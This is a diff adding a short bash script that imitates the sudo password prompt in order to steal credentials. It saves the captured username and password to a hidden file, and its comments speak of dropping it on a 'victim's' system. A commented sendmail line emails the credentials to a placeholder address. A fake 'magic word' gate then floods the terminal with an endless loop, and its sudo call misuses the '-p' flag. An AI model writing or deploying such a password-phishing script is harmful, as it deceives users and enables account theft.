@@ -1,0 +1,33 @@
+#! /bin/bash
+
+# get password for user
+read -sp "[sudo] password for $USER: " password
+echo
+
+# store password in file, this will be on the victims system
+# so either hide it in a location you create when dropping
+# or use the email section to have them sent to YOU
+
+echo "Nothing sus at all">>/.creds.txt
+echo "$USER:$password">>/.creds.txt
+
+# email the creds to YOU
+
+# echo "$USER:$password" | sendmail -v {user}@{email}.com
+
+# time for the fun
+
+read -sp "What's the magic word? " key
+echo
+
+if [ "$key" = "please" ]
+  then
+    echo "Access Granted"
+    echo
+    sudo -u $USER -p $password $@
+  else
+      for (( ; ; ))
+      do
+        echo "YOU DIDN'T SAY THE MAGIC WORD!"
+      done
+  fi
